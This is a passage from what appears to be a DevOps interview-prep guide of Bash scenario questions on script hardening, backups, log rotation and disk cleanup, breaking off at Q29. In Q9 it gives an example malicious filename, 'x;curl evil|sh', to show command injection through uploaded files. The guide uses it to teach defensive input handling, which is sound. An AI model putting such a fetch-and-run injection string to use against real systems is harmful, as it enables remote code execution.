# Shell Scripting — Scenarios & Troubleshooting

<!-- DEVOPS-SHACK:HEADER -->
<p align="center">
  <a href="https://www.youtube.com/@devopsshack"><img alt="YouTube DevOps Shack" src="https://img.shields.io/badge/YouTube-DevOps%20Shack-FF0000?style=flat-square&logo=youtube&logoColor=white"/></a>
  <a href="https://www.youtube.com/@shackverse"><img alt="YouTube DevOps Shack Hindi" src="https://img.shields.io/badge/Hindi-@shackverse-FF0000?style=flat-square&logo=youtube&logoColor=white"/></a>
  <a href="https://devopsshack.com"><img alt="devopsshack.com" src="https://img.shields.io/badge/Courses-devopsshack.com-C6FF4D?style=flat-square&labelColor=0B0F1A"/></a>
  <a href="https://www.instagram.com/devopsshack"><img alt="Instagram" src="https://img.shields.io/badge/Instagram-@devopsshack-E4405F?style=flat-square&logo=instagram&logoColor=white"/></a>
  <a href="https://github.com/jaiswaladi246/DevOps-Cloud-Interview-Preparation-by-DevOps-Shack"><img alt="Original repo" src="https://img.shields.io/badge/Original-DevOps%20Shack%20repo-4DE8FF?style=flat-square&logo=github&labelColor=0B0F1A"/></a>
</p>
<p align="center"><sub>Part of <b><a href="https://github.com/jaiswaladi246/DevOps-Cloud-Interview-Preparation-by-DevOps-Shack">DevOps &amp; Cloud Interview Preparation</a></b> — created by <b><a href="https://www.youtube.com/@devopsshack">DevOps Shack</a></b>. Free to learn from; please credit DevOps Shack when sharing.</sub></p>
<!-- /DEVOPS-SHACK:HEADER -->

> Real automation situations and real error messages: backups to S3, log rotation, health checks, deploys, user management, alerts, cron and systemd timers, and the Bash errors you will meet at 3 AM · 200 questions · 🟢 Beginner 🟡 Intermediate 🔴 Advanced

[⬅ Back to Shell Scripting](./README.md) · [🏠 Home](../README.md)

## Table of contents
- [Scenarios: writing and hardening scripts](#scenarios-writing-and-hardening-scripts) — Q1–Q20
- [Scenarios: backups, log rotation and housekeeping](#scenarios-backups-log-rotation-and-housekeeping) — Q21–Q40
- [Scenarios: health checks, monitoring and alerts](#scenarios-health-checks-monitoring-and-alerts) — Q41–Q60
- [Scenarios: deployments, user management and fleet operations](#scenarios-deployments-user-management-and-fleet-operations) — Q61–Q80
- [Scenarios: text processing and scheduling decisions](#scenarios-text-processing-and-scheduling-decisions) — Q81–Q100
- [Troubleshooting: syntax, parsing and interpreter errors](#troubleshooting-syntax-parsing-and-interpreter-errors) — Q101–Q120
- [Troubleshooting: quoting, expansion and tool-input bugs](#troubleshooting-quoting-expansion-and-tool-input-bugs) — Q121–Q140
- [Troubleshooting: strict mode, exit codes, pipelines and traps](#troubleshooting-strict-mode-exit-codes-pipelines-and-traps) — Q141–Q160
- [Troubleshooting: cron and systemd timers](#troubleshooting-cron-and-systemd-timers) — Q161–Q180
- [Troubleshooting: tools, portability, permissions and environment](#troubleshooting-tools-portability-permissions-and-environment) — Q181–Q200

---

## Scenarios: writing and hardening scripts

<!-- DEVOPS-SHACK:SECTION -->
> 🎥 **Learn this hands-on with DevOps Shack** → [YouTube @devopsshack](https://www.youtube.com/@devopsshack) · [Hindi @shackverse](https://www.youtube.com/@shackverse) · [Courses at devopsshack.com](https://devopsshack.com)

### Q1. You inherit a 600-line `deploy.sh` with no error handling. It "sometimes half-deploys". Where do you start? 🟡

<details>
<summary><b>Answer</b></summary>

**Situation read →** Half-deploys mean a step fails and the script keeps going. Before rewriting anything, make failures visible and stop on them.

**What I'd do →**
1. Put it in Git if it is not already, and run `shellcheck -x deploy.sh` to get a list of real bugs (unquoted variables, unchecked `cd`, masked return codes).
2. Add a strict header and an error trap so the next failure tells us where:
   ```bash
   set -Eeuo pipefail
   trap 'echo "FAILED line $LINENO: $BASH_COMMAND (exit $?)" >&2' ERR
   ```
3. Run it against staging with `bash -x` and a `PS4` that prints line numbers, fixing everything strict mode trips on (often optional variables needing `${VAR:-}`).
4. Restructure so the switch-over is a single atomic step at the end (build in a new release directory, then `ln -sfn` and reload), so a failure before that point changes nothing live.
5. Add a lock (`flock -n`) so two people cannot deploy at once.

**Why →** Most "sometimes" bugs are unchecked failures plus non-atomic changes. Strict mode surfaces them, atomic switching makes them harmless.

**Interview tip →** Say you would not big-bang rewrite it; you make it observable first, then refactor in small, tested steps.

</details>

### Q2. A script with `#!/bin/sh` works on CentOS but fails on Ubuntu with `Syntax error: "(" unexpected`. What is going on and what do you do? 🟢

<details>
<summary><b>Answer</b></summary>

**Situation read →** On CentOS/RHEL `/bin/sh` is Bash; on Debian/Ubuntu it is `dash`, which does not support arrays, `[[ ]]` or `function` syntax.

**What I'd do →**
1. Confirm: `ls -l /bin/sh` (Ubuntu shows `-> dash`) and find bashisms with `shellcheck -s sh script.sh` or `checkbashisms script.sh`.
2. If Bash is guaranteed on every target, change the shebang to `#!/usr/bin/env bash`.
3. If it must run in minimal images (Alpine, BusyBox), rewrite the bashisms in POSIX form instead.
4. Add ShellCheck to CI so the shebang and the code always agree.

**Why →** The shebang is a contract: it must name the shell the code is actually written for.

**Interview tip →** Mention that `sh script.sh` on the command line also forces `dash`, regardless of the shebang.

</details>

### Q3. You need a deploy script that humans and CI both call with `--env`, `--version` and `--dry-run`. How do you design its interface? 🟢

<details>
<summary><b>Answer</b></summary>

**Situation read →** A good CLI is predictable for humans and strict for machines: clear flags, validation, meaningful exit codes, no prompts in CI.

**What I'd do →**
1. Parse with a `while (($#)); case $1 in` loop to support long options, and reject unknown flags with exit 2.
2. Validate: `[[ $env =~ ^(dev|staging|prod)$ ]]`, `[[ $version =~ ^v[0-9]+\.[0-9]+\.[0-9]+$ ]]`.
3. Support env vars as defaults for CI (`env=${DEPLOY_ENV:-}`), with flags overriding them.
4. Prompt for confirmation on prod only when `[[ -t 0 ]]`; in CI require an explicit `--yes`.
5. Implement `--dry-run` through a `run()` wrapper that prints commands with `printf '%q '` instead of executing them.
6. Document exit codes in `--help` (0 ok, 1 failed, 2 usage, 3 health check failed).

**Why →** CI pipelines branch on exit codes, and humans need `--help` and dry runs to trust a script.

**Interview tip →** Say "the script never prompts when there is no terminal", which shows you have been burned by a hung CI job.

</details>

### Q4. A maintenance script must run as the `deploy` user, never as root, because files it creates must be owned by `deploy`. How do you enforce that? 🟢

<details>
<summary><b>Answer</b></summary>

**Situation read →** Running as root creates root-owned files the app cannot later modify, a classic source of `Permission denied` after a manual run.

**What I'd do →**
1. Check the effective user at the top:
   ```bash
   if [[ $(id -un) != deploy ]]; then
     if [[ $EUID -eq 0 ]]; then exec runuser -u deploy -- "$0" "$@"; fi
     echo "run as deploy: sudo -u deploy $0" >&2; exit 1
   fi
   ```
2. Re-executing with `runuser` (or `sudo -u deploy`) keeps the operator experience simple while guaranteeing ownership.
3. Set `umask 027` so new files are not world-readable.

**Why →** Re-exec as the right user prevents the mistake instead of just reporting it.

**Interview tip →** Use `$EUID` (effective UID) rather than `$USER`, which is just an environment variable and can be wrong under `sudo`.

</details>

### Q5. Ten scripts in a repo each copy-paste their own `log`, `die`, retry and config loading. How do you fix this? 🟡

<details>
<summary><b>Answer</b></summary>

**Situation read →** Duplicated helpers drift apart; a fix in one script never reaches the others.

**What I'd do →**
1. Create `lib/common.sh` with the shared functions, a `# shellcheck shell=bash` directive, and a double-source guard (`[[ -n ${_COMMON_LOADED:-} ]] && return 0`).
2. Source it relative to the script, not the current directory:
   ```bash
   SCRIPT_DIR=$(dirname -- "$(readlink -f -- "${BASH_SOURCE[0]}")")
   # shellcheck source=../lib/common.sh
   source "$SCRIPT_DIR/../lib/common.sh"
   ```
3. Keep the library free of side effects: only function definitions and defaults, no `set -e`, no `exit` at load time (callers own their strict mode).
4. Prefix library functions and locals (`opskit_init`, `_try`) to avoid collisions and dynamic-scoping bugs.
5. Add bats tests for the library itself, and configure `.shellcheckrc` with `source-path=SCRIPTDIR`.

**Why →** A tested library turns ten inconsistent scripts into ten thin scripts with one well-understood core.

**Interview tip →** Mention the dynamic-scoping trap: a library `retry` with `local n` silently breaks a caller's function that uses a global `n`.

</details>

### Q6. A script is run both by engineers and by cron. Cron logs are full of colour codes and the script sometimes hangs waiting for input. Fix it. 🟢

<details>
<summary><b>Answer</b></summary>

**Situation read →** The script assumes a terminal. Under cron, stdin and stdout are not TTYs.

**What I'd do →**
1. Enable colours only when stdout is a terminal and `NO_COLOR` is unset:
   ```bash
   if [[ -t 1 && -z ${NO_COLOR:-} ]]; then RED=$'\e[31m' RST=$'\e[0m'; else RED='' RST=''; fi
   ```
2. Never prompt without a terminal: `[[ -t 0 ]] || die "refusing to prompt without a TTY; pass --yes"`.
3. Pass non-interactive flags to tools: `apt-get -y`, `DEBIAN_FRONTEND=noninteractive`, `ssh -o BatchMode=yes`, `kubectl --context` explicitly.
4. Redirect stdin from `/dev/null` in the cron line to be safe: `... < /dev/null`.

**Why →** Interactive assumptions are the main reason scripts hang in automation.

**Interview tip →** Name `ssh -o BatchMode=yes`, which makes SSH fail instead of waiting for a password.

</details>

### Q7. Your team decides all scripts must pass ShellCheck. The first run reports 400 findings across 60 scripts. How do you roll this out? 🟡

<details>
<summary><b>Answer</b></summary>

**Situation read →** Blocking CI on 400 findings stops all work; ignoring them keeps the bugs. Ratchet instead.

**What I'd do →**
1. Add ShellCheck to CI for **changed files only** first:
   ```bash
   git diff --name-only --diff-filter=ACM origin/main -- '*.sh' | xargs -r shellcheck -x
   ```
2. Fix the error-level findings everywhere immediately (`shellcheck -S error`), since those are real bugs.
3. Commit a `.shellcheckrc` with agreed settings (`source-path=SCRIPTDIR`, `external-sources=true`).
4. Fix warnings script by script, starting with anything run as root or in production paths.
5. Allow inline disables only with a reason comment, and review them in PRs.
6. Once clean, run it on all files and make it blocking; add a pre-commit hook.

**Why →** A ratchet improves quality without freezing delivery, and the riskiest scripts get fixed first.

**Interview tip →** Say which codes you fix first: SC2086, SC2046, SC2164 and SC2155 cause real incidents.

</details>

### Q8. A script edits `/etc/nginx/nginx.conf` and reloads nginx. If someone hits Ctrl+C mid-way, nginx is left with a broken config. How do you make it safe? 🟡

<details>
<summary><b>Answer</b></summary>

**Situation read →** In-place edits are not atomic, and an interrupted edit leaves a half-written file that fails on the next reload or reboot.

**What I'd do →**
1. Build the new config in a temp file in the same directory: `tmp=$(mktemp /etc/nginx/.nginx.conf.XXXXXX)`.
2. Trap cleanup: `trap 'rm -f -- "$tmp"' EXIT`.
3. Validate the candidate before installing it: `nginx -t -c "$tmp"` (or copy into place in a staging include and run `nginx -t`).
4. Keep a backup, then swap atomically: `cp -a nginx.conf nginx.conf.bak && mv -f -- "$tmp" nginx.conf`.
5. Reload, and on failure restore the backup and reload again.

**Why →** `mv` on the same filesystem is atomic; an interruption at any point leaves either the old or the new config, never half of one.

**Interview tip →** Mention that `SIGKILL` cannot be trapped, which is exactly why the atomic rename matters more than the trap.

</details>

### Q9. A script processes files that customers upload to `/srv/uploads`. What security problems do you watch for? 🔴

<details>
<summary><b>Answer</b></summary>

**Situation read →** Filenames are attacker-controlled input. They can contain spaces, newlines, leading dashes, `..`, glob characters and shell metacharacters.

**What I'd do →**
1. Never parse `ls`; iterate with `find ... -print0 | while IFS= read -r -d '' f`.
2. Quote every expansion and pass `--` before filenames: `mv -- "$f" "$dest/"`.
3. Never put filenames into `eval`, `bash -c`, `ssh host "..."` or `find -exec sh -c '... {}'` (use `sh -c '...' _ {}` so the name is an argument).
4. Reject or sanitize names against an allow-list: `[[ ${f##*/} =~ ^[A-Za-z0-9._-]{1,128}$ ]] || quarantine "$f"`.
5. Do not follow symlinks the uploader could plant (`find -P`, check `[[ -L $f ]]`), and run the script as an unprivileged user.
6. Process in a private temp dir created with `mktemp -d`.

**Why →** A file named `-rf` or `x;curl evil|sh` turns a sloppy script into remote code execution or data loss.

**Interview tip →** Demonstrate the `sh -c '...' _ "$f"` pattern; it shows you know how to pass data as arguments rather than code.

</details>

### Q10. A script needs an API token, and the script lives in a Git repo. How do you handle the token? 🟡

<details>
<summary><b>Answer</b></summary>

**Situation read →** The token must never be committed, logged or visible in the process list.

**What I'd do →**
1. Read it at runtime from the platform's secret source: an env var injected by CI (masked), a file with mode 0600 (`/etc/opskit/token`), or a secrets manager:
   ```bash
   token=$(aws secretsmanager get-secret-value --secret-id prod/api --query SecretString --output text)
   ```
2. Fail fast if missing: `: "${API_TOKEN:?API_TOKEN not set}"`.
3. Keep it out of argv: `curl -H @<(printf 'Authorization: Bearer %s\n' "$token") "$url"` (curl 7.55+ reads headers from a file).
4. Disable tracing around it (`set +x`) and never echo it; mask in logs.
5. Add a secret scanner (gitleaks) in pre-commit and CI.

**Why →** Secrets leak through Git history, `ps`, `set -x` and log aggregation far more often than through clever attacks.

**Interview tip →** Mention that rotating a leaked token is mandatory; deleting the commit is not enough.

</details>

### Q11. A data migration script runs for 40 minutes over 5,000 items. When it fails at item 3,000, rerunning starts from scratch. How do you make it resumable? 🔴

<details>
<summary><b>Answer</b></summary>

**Situation read →** Long batch jobs need checkpoints and idempotent steps, otherwise every failure costs the full runtime and may duplicate work.

**What I'd do →**
1. Make each item idempotent (check before acting, or use upserts).
2. Record progress in a state file after each item succeeds, written atomically:
   ```bash
   state=/var/lib/migrate/done.txt
   touch "$state"
   while IFS= read -r id; do
     grep -qxF -- "$id" "$state" && continue
     migrate_item "$id"
     printf '%s\n' "$id" >> "$state"
   done < items.txt
   ```
3. For large sets, use a sorted done-list and `comm -23 <(sort items.txt) <(sort "$state")` to compute the remaining work once, instead of grepping per item.
4. Take a lock so two resumptions cannot run at once, and add a `--reset` flag to clear state deliberately.
5. Log a progress line every N items with an ETA.

**Why →** Checkpointing turns a 40-minute retry into a 1-minute one, and idempotency makes reruns safe.

**Interview tip →** Say you append to the state file only **after** the item succeeds, so a crash mid-item retries that item.

</details>

### Q12. The same script must run on engineers' macOS laptops and on Linux CI runners. What breaks, and how do you handle it? 🟡

<details>
<summary><b>Answer</b></summary>

**Situation read →** macOS ships Bash 3.2 and BSD userland; Linux has Bash 5 and GNU tools. Flags differ for `sed -i`, `date -d`, `readlink -f`, `stat -c`, `grep -P`, `xargs -r`.

**What I'd do →**
1. Require Bash 4+ explicitly and tell macOS users to `brew install bash coreutils gnu-sed grep`:
   ```bash
   (( BASH_VERSINFO[0] >= 4 )) || { echo "need Bash 4+ (brew install bash)" >&2; exit 1; }
   ```
2. Prefer portable forms: `sed -i.bak ... && rm *.bak`, `$(cd "$(dirname "$0")" && pwd)` instead of `readlink -f`.
3. Where GNU behaviour is needed, detect and use `gdate`, `gsed` when present.
4. Run CI on both `ubuntu-latest` and `macos-latest` if laptops are a supported target.
5. Or remove the problem: run the script inside a container image with pinned tools.

**Why →** "Works on my Mac" is the shell equivalent of "works on my machine".

**Interview tip →** Mention that `#!/usr/bin/env bash` picks up Homebrew's Bash on macOS, while `#!/bin/bash` pins Apple's 3.2.

</details>

### Q13. You are asked to add `set -e` to a large legacy script that has run in production for years. What are the risks? 🟡

<details>
<summary><b>Answer</b></summary>

**Situation read →** The script may rely on commands failing harmlessly: `grep` returning 1 when nothing matches, `diff` returning 1 when files differ, `((count++))` at zero, `test` as the last line of a function.

**What I'd do →**
1. Grep for commands with meaningful non-zero codes: `grep`, `diff`, `cmp`, `test`/`[`, `((`, `read` at EOF, `pgrep`, `systemctl is-active`.
2. Make intended "failures" explicit: `grep -q x f || true`, `if grep -q ...; then`, `count=$((count + 1))`.
3. Run it in staging with `set -Eeuo pipefail` and an `ERR` trap that logs the line, and fix each trip.
4. Roll out behind a flag at first (`STRICT=1`) if the script is critical.

**Why →** `set -e` changes behaviour for every command; blindly adding it can turn a working script into one that stops halfway, which may be worse.

**Interview tip →** Saying "`set -e` is a safety net, not error handling" signals maturity.

</details>

### Q14. A long script needs useful logs: levels, timestamps, and a debug mode that does not require editing the code. Design it. 🟢

<details>
<summary><b>Answer</b></summary>

**Situation read →** Logs must be greppable and the level must be controllable at runtime.

**What I'd do →**
1. A single `log` function writing to stderr:
   ```bash
   LOG_LEVEL=${LOG_LEVEL:-INFO}
   declare -A _lvl=([DEBUG]=10 [INFO]=20 [WARN]=30 [ERROR]=40)
   log() {
     (( _lvl[$1] >= _lvl[$LOG_LEVEL] )) || return 0
     printf '%s %-5s [%s] %s\n' "$(date -u +%FT%TZ)" "$1" "${0##*/}" "${*:2}" >&2
   }
   ```
2. `LOG_LEVEL=DEBUG ./script.sh` turns on debug lines; `TRACE=1` turns on `set -x` with a line-number `PS4`.
3. Under systemd, rely on the journal; elsewhere, also send to syslog with `logger -t`.

**Why →** Uniform, leveled logs make incidents answerable with `grep` and `journalctl` instead of guesswork.

**Interview tip →** Mention logging to stderr so stdout stays clean for data.

</details>

### Q15. A script accepts an environment name, a semantic version and a hostname from users. How do you validate them? 🟢

<details>
<summary><b>Answer</b></summary>

**Situation read →** Validate against an allow-list before the values touch any command.

**What I'd do →**
```bash
[[ $env =~ ^(dev|staging|prod)$ ]]                         || die "invalid env: $env"
[[ $version =~ ^v?[0-9]+\.[0-9]+\.[0-9]+(-[0-9A-Za-z.-]+)?$ ]] || die "invalid version: $version"
[[ $host =~ ^[a-z0-9]([a-z0-9-]{0,61}[a-z0-9])?(\.[a-z0-9]([a-z0-9-]{0,61}[a-z0-9])?)*$ ]] || die "invalid host: $host"
```
1. Store complex regexes in variables and keep them unquoted on the right of `=~`.
2. Normalize first if needed (`env=${env,,}`).
3. Exit with code 2 for invalid input so callers can distinguish usage errors.

**Why →** Allow-lists block typos and injection in one step; deny-lists always miss a character.

**Interview tip →** Mention that validation must happen before the value is used in a path, `ssh`, `sed` or SQL.

</details>

### Q16. A Bash script has grown to 900 lines, parses JSON in 40 places and has nested associative-array tricks. Your manager asks whether to keep it. What do you say? 🟡

<details>
<summary><b>Answer</b></summary>

**Situation read →** The script has outgrown the language. Bash is strong at orchestrating commands, weak at data structures and testable logic.

**What I'd do →**
1. Identify the parts that are glue (calling `kubectl`, `aws`, `rsync`) and the parts that are logic (JSON transforms, decisions).
2. Propose moving the logic to Python (or Go if a static binary helps distribution), with unit tests, while keeping a thin Bash wrapper if operators like the interface.
3. Migrate incrementally: one subcommand at a time, both versions tested against the same fixtures.
4. Until then, add ShellCheck and bats around the current script so the migration has a safety net.

**Why →** Maintenance cost and bug rate grow sharply when Bash is used as a general-purpose language.

**Interview tip →** Give a rule of thumb, such as "more than about 300 lines, or real data structures, means Python".

</details>

### Q17. A container entrypoint (Alpine, POSIX `sh` only) must wait for Postgres before running migrations. Write the approach. 🟡

<details>
<summary><b>Answer</b></summary>

**Situation read →** No Bash, so no `/dev/tcp`, arrays or `[[ ]]`. The wait must be bounded, and the app must become PID 1.

**What I'd do →**
```sh
#!/bin/sh
set -eu
deadline=$(( $(date +%s) + ${DB_WAIT_SECONDS:-60} ))
until pg_isready -q -h "$DB_HOST" -p "${DB_PORT:-5432}"; do
  if [ "$(date +%s)" -ge "$deadline" ]; then
    echo "database not ready after ${DB_WAIT_SECONDS:-60}s" >&2
    exit 1
  fi
  sleep 2
done
./migrate up
exec "$@"
```
1. `pg_isready` comes with the Postgres client package; `nc -z host port` is a fallback.
2. `exec "$@"` hands PID 1 to the real process so it receives `SIGTERM`.
3. Check with `shellcheck -s sh entrypoint.sh`.

**Why →** Unbounded waits hang deploys; a missing `exec` breaks graceful shutdown.

**Interview tip →** Mention that in Kubernetes, readiness probes and init containers are often a better place for this than the entrypoint.

</details>

### Q18. You want tests for existing scripts that call `curl`, `aws` and `systemctl`. How do you test them without touching real systems? 🟡

<details>
<summary><b>Answer</b></summary>

**Situation read →** External commands must be replaced with controllable fakes, and each test needs an isolated filesystem.

**What I'd do →**
1. Use bats-core; put stub executables in `tests/stubs/` and prepend that directory to `PATH` in `setup()`.
2. Each stub logs its arguments to a file and returns canned output or an exit code from an environment variable (`STUB_CURL_RC=22`).
3. Make the script configurable through environment variables for paths (`STATE_DIR`, `LOG_FILE`, `CONF`), defaulting to production paths.
4. Assert on exit status, output, files created and the stub call log.
5. Run `bats tests` and `shellcheck` in CI on every PR.

**Why →** PATH stubs need no changes to the script's code and make failure paths (timeouts, 503s, AccessDenied) easy to test.

**Interview tip →** Point to a failure-path test, such as "upload fails, so the script exits 1 and raises an alert". That is where scripts usually break.

</details>

### Q19. A nightly job should post to Slack when it starts, succeeds or fails, including the duration and the last 20 log lines on failure. Design it. 🟡

<details>
<summary><b>Answer</b></summary>

**Situation read →** Notifications must work even when the job crashes, so they belong in traps, not at the end of the happy path.

**What I'd do →**
```bash
log=$(mktemp); exec > >(tee -a "$log") 2>&1
start=$SECONDS
notify() { jq -n --arg t "$1" '{text: $t}' |
  curl -fsS --max-time 10 -H 'Content-Type: application/json' --data-binary @- "$SLACK_WEBHOOK" >/dev/null || true; }
finish() {
  local rc=$?
  if (( rc == 0 )); then notify "backup OK in $((SECONDS - start))s"
  else notify "backup FAILED (exit $rc) after $((SECONDS - start))s"$'\n'"$(tail -n 20 "$log")"; fi
  rm -f -- "$log"
}
trap finish EXIT
notify "backup started on $(hostname -s)"
```
1. Build JSON with `jq` so log lines with quotes cannot break the payload.
2. Notification failures must never fail the job (`|| true`).

**Why →** The `EXIT` trap sees the real exit code in all cases, including `set -e` aborts.

**Interview tip →** Mention avoiding alert fatigue: notify on failure and on recovery, and keep "started" messages for jobs people actively watch.

</details>

### Q20. Other teams want to use your script as a CLI tool. What do you add before sharing it? 🟢

<details>
<summary><b>Answer</b></summary>

**Situation read →** Shared tools need a stable interface, versioning and documentation.

**What I'd do →**
1. `--help` with usage, options, examples and exit codes; `--version` printing a version stamped at release.
2. Consistent option parsing and validation; non-zero exit codes documented.
3. Dependency check at startup (`require_cmd jq curl aws`) with install hints.
4. A README, a CHANGELOG and semantic version tags in Git.
5. Distribution: a release tarball or package with checksums, or a container image; never "curl from main | bash".
6. CI with ShellCheck, `shfmt` and bats.

**Why →** Without versioning, a change you make for your team silently breaks theirs.

**Interview tip →** Mention keeping backward compatibility for flags, or deprecating them with a warning first.

</details>

---

## Scenarios: backups, log rotation and housekeeping

<!-- DEVOPS-SHACK:SECTION -->
> 🎥 **Learn this hands-on with DevOps Shack** → [YouTube @devopsshack](https://www.youtube.com/@devopsshack) · [Hindi @shackverse](https://www.youtube.com/@shackverse) · [Courses at devopsshack.com](https://devopsshack.com)

### Q21. Design a nightly backup of `/etc` and application data to S3 with retention. 🟡

<details>
<summary><b>Answer</b></summary>

**Situation read →** A backup is only useful if it is complete, verifiable, off-host, retained correctly and alerts on failure.

**What I'd do →**
1. Archive with a UTC timestamp and the hostname: `tar -czf "$dir/$(hostname -s)-$(date -u +%Y%m%dT%H%M%SZ).tar.gz" -C / etc srv/app/shared`.
2. Write to a temp file and `mv` into place; generate a `.sha256` next to it.
3. Upload with retries and server-side encryption: `aws s3 cp --sse AES256 "$f" "s3://$bucket/servers/$host/"`, then confirm with `aws s3api head-object` that the size matches.
4. Local retention: keep the newest N archives; S3 retention: a bucket lifecycle rule (expire after 35 days, or transition to Glacier), plus versioning and Object Lock if ransomware is in scope.
5. Run it from a systemd timer with `Persistent=true`, `flock`, and `OnFailure=` alerting.

**Why →** Each step closes a known failure mode: partial files, silent corruption, local-only copies, unbounded growth and unnoticed failures.

**Interview tip →** Say retention in S3 belongs in a lifecycle policy, not in a script that deletes objects with broad permissions.

</details>

### Q22. Write the core of a Postgres backup that streams `pg_dump` through gzip to S3 and never uploads an empty dump. 🟡

<details>
<summary><b>Answer</b></summary>

**Situation read →** In `pg_dump | gzip`, a failed `pg_dump` still produces a small valid gzip file, and without `pipefail` the job reports success.

**What I'd do →**
```bash
set -Eeuo pipefail
out="/var/backups/pg/app-$(date -u +%Y%m%dT%H%M%SZ).sql.gz"
tmp=$(mktemp "${out}.XXXXXX"); trap 'rm -f -- "$tmp"' EXIT
pg_dump --format=plain --no-owner -h "$PGHOST" -U backup app | gzip -6 > "$tmp"
gzip -t "$tmp"
(( $(stat -c %s "$tmp") > 1024 )) || { echo "dump suspiciously small" >&2; exit 1; }
mv -- "$tmp" "$out"
aws s3 cp --only-show-errors --sse aws:kms "$out" "s3://$BUCKET/pg/"
```
1. `pipefail` makes the pipeline fail if `pg_dump` fails.
2. Credentials come from `~/.pgpass` (mode 0600) or `PGPASSWORD` from a secret, not argv.
3. For large databases use `--format=custom` (compressed, parallel restore with `pg_restore -j`).

**Why →** Empty backups are the most common way teams discover they had no backup.

**Interview tip →** Mention a size sanity check, and a scheduled test restore, as two separate guards.

</details>

### Q23. Backups have "succeeded" every night for a year, but the first real restore failed. How do you make backups trustworthy? 🔴

<details>
<summary><b>Answer</b></summary>

**Situation read →** Nobody tested restores, so "success" only meant "the script exited 0".

**What I'd do →**
1. Add an automated restore test on a schedule (weekly), in an isolated environment:
   ```bash
   latest=$(aws s3 ls "s3://$BUCKET/pg/" | sort | tail -n1 | awk '{print $4}')
   aws s3 cp "s3://$BUCKET/pg/$latest" /restore/
   createdb restore_test && gunzip -c "/restore/$latest" | psql -v ON_ERROR_STOP=1 -q restore_test
   psql -tAc 'select count(*) from orders' restore_test   # compare with production metrics
   ```
2. Assert on content: row counts within a tolerance, the latest record's timestamp is recent, critical tables exist.
3. Verify checksums of archives before restoring, and alert if the newest backup is older than 26 hours.
4. Record restore duration as a metric; that is your real RTO.
5. Document the restore runbook and rehearse it.

**Why →** A backup you have not restored is a hypothesis, not a backup.

**Interview tip →** Use "RTO and RPO" and say restore tests produce the evidence for both.

</details>

### Q24. `/var` is 100% full because an app's logs were never rotated, and the app now fails to start. What do you do now, and what do you set up after? 🟢

<details>
<summary><b>Answer</b></summary>

**Situation read →** Two jobs: free space safely right now, then make sure it cannot happen again.

**What I'd do →**
1. Find the culprit: `du -xh --max-depth=2 /var 2>/dev/null | sort -h | tail`.
2. If the app holds the file open, truncate it instead of deleting it: `: > /var/log/app/app.log` (or compress a copy first if you need it).
3. Compress or delete old rotated files: `find /var/log/app -name '*.log.*' -mtime +3 -delete`.
4. Check for deleted-but-open files: `lsof +L1`.
5. Add `/etc/logrotate.d/app`:
   ```text
   /var/log/app/*.log {
       daily
       rotate 14
       compress
       delaycompress
       missingok
       notifempty
       copytruncate
   }
   ```
6. Test with `logrotate -d /etc/logrotate.d/app` (debug, no changes), then `logrotate -f` once.
7. Add a disk-usage alert at 80% and 90%.

**Why →** Deleting an open log frees no space until the process closes it; truncation does.

**Interview tip →** Mention `logrotate -d` for a dry run. It shows you test config before applying it.

</details>

### Q25. Should you use `copytruncate` or a `postrotate` signal for an application's logs? How do you decide? 🟡

<details>
<summary><b>Answer</b></summary>

**Situation read →** The choice depends on whether the application can reopen its log file.

**What I'd do →**
1. If the app supports reopening on a signal (nginx `USR1`, many daemons on `HUP`), use `create` plus `postrotate`:
   ```text
   /var/log/nginx/*.log {
       daily
       rotate 14
       compress
       delaycompress
       sharedscripts
       postrotate
           [ -s /run/nginx.pid ] && kill -USR1 "$(cat /run/nginx.pid)"
       endscript
   }
   ```
2. If it cannot reopen (some Java or Node apps writing to a file), use `copytruncate`, accepting that lines written between the copy and the truncate can be lost.
3. Best of all for new services: log to stdout and let journald or the container runtime handle rotation.

**Why →** Rotating by rename without a reopen means the app keeps writing to the renamed (and later deleted) file, and disk usage never drops.

**Interview tip →** Explain why `delaycompress` exists: the app may still write to the `.1` file briefly after rotation.

</details>

### Q26. `/srv/app/releases` has 300 old release directories. Write a cleanup that keeps the newest 5 and never deletes the current release. 🟢

<details>
<summary><b>Answer</b></summary>

**Situation read →** Sort by name if names are timestamps, and protect the directory `current` points to.

**What I'd do →**
```bash
releases=/srv/app/releases
current=$(readlink -f /srv/app/current)
mapfile -t old < <(find "$releases" -mindepth 1 -maxdepth 1 -type d -printf '%f\n' | sort -r | tail -n +6)
for r in "${old[@]}"; do
  [[ "$releases/$r" == "$current" ]] && continue
  rm -rf -- "${releases:?}/$r"
  echo "removed $r"
done
```
1. Release names like `20261109T143000Z` sort chronologically as strings.
2. `${releases:?}` guards against an empty variable.

**Why →** Keeping a few releases enables instant rollback; deleting the live one would cause an outage.

**Interview tip →** Mention that sorting by name is more reliable than by mtime, which changes when someone touches a file.

</details>

### Q27. A Docker host keeps filling its disk. Write a safe cleanup approach. 🟢

<details>
<summary><b>Answer</b></summary>

**Situation read →** Images, stopped containers, build cache and container logs pile up. Cleanup must not remove what running workloads need.

**What I'd do →**
1. Measure: `docker system df -v`.
2. Remove only unused objects older than a threshold:
   ```bash
   docker container prune -f --filter 'until=24h'
   docker image prune -af --filter 'until=168h'
   docker builder prune -f --filter 'until=72h'
   ```
3. Avoid `docker volume prune` in automation unless you are sure; volumes hold data.
4. Cap container logs in `/etc/docker/daemon.json`: `{"log-driver":"json-file","log-opts":{"max-size":"10m","max-file":"3"}}`.
5. Run the prune from a weekly systemd timer and alert on disk usage.

**Why →** Time filters keep recently used images for fast rollbacks; log caps stop the most common runaway growth.

**Interview tip →** Mention that `docker system prune -a --volumes` is a data-loss command, not a routine one.

</details>

### Q28. You deleted a 40 GB log file, but `df` still shows the disk full. What happened and how do you script the fix? 🟡

<details>
<summary><b>Answer</b></summary>

**Situation read →** A process still holds the file open; the inode and its blocks are freed only when the last descriptor closes.

**What I'd do →**
1. Find deleted-but-open files: `lsof +L1` or `find /proc/*/fd -lname '*(deleted)' 2>/dev/null`.
2. Truncate through the process's file descriptor without restarting it:
   ```bash
   lsof -nP +L1 2>/dev/null | awk 'NR > 1 && $7 > 1e9 {print $2, $4}' |
   while read -r pid fd; do
     fd=${fd%[rwu]}
     : > "/proc/$pid/fd/$fd"
     echo "truncated pid $pid fd $fd"
   done
   ```
3. Or restart/reload the service so it reopens its logs.
4. Fix rotation so the app is signalled or `copytruncate` is used.

**Why →** `rm` removes the name, not the data, while a process holds it.

**Interview tip →** Mention that `du` and `df` disagreeing is the tell-tale sign of deleted open files.

</details>

### Q29. You need to back up 2 TB of mostly unchanged files nightly over a limited link. A full tar each night is impossible. What do you do? 🔴

<details>
